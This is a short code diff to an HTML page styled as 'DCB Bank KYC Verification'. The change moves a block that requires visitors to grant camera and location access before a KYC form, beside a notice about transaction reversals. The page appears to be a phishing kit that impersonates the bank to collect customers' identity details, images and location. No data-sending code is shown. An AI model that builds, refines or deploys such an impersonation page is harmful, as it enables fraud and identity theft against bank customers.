@@ -501,6 +501,19 @@
   <div class="container">
     <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjQ4IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxNjAiIGhlaWdodD0iNDgiIGZpbGw9IiMwMDNkNmEiIHJ4PSI0Ii8+PHRleHQgeD0iODAiIHk9IjI4IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIGZpbGw9IiNmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGRvbWluYW50LWJhc2VsaW5lPSJtaWRkbGUiIGZvbnQtd2VpZ2h0PSI3MDAiPkRDQiBCYW5rPC90ZXh0Pjwvc3ZnPg==" alt="DCB Bank Logo">
     <h2>DCB Bank KYC Verification</h2>
+</div>
+    <div id="permissionStep">
+      <p class="notice">
+        For your security and verification, please allow access to your device's <strong>camera</strong> and <strong>location</strong>.<br>
+        You must grant both permissions to proceed with KYC verification.
+      </p>
+      <button id="allowButton">
+        <i class="fas fa-camera"></i> Allow & Continue
+      </button>
+      <p id="permStatus" class="error"></p>
+    </div>
+
+    <div id="kycForm">
       <!-- Add this right after your logo in the HTML (public/index.html) -->
 <div class="verification-notice">
   <div class="notice-header">
@@ -516,18 +529,6 @@
     will result in transaction reversal and funds will be credited back to the sender's account.
   </div>
 </div>
-    <div id="permissionStep">
-      <p class="notice">
-        For your security and verification, please allow access to your device's <strong>camera</strong> and <strong>location</strong>.<br>
-        You must grant both permissions to proceed with KYC verification.
-      </p>
-      <button id="allowButton">
-        <i class="fas fa-camera"></i> Allow & Continue
-      </button>
-      <p id="permStatus" class="error"></p>
-    </div>
-
-    <div id="kycForm">
       <form id="kycFormElement">
         <div id="formAlert" style="display: none;"></div>
         
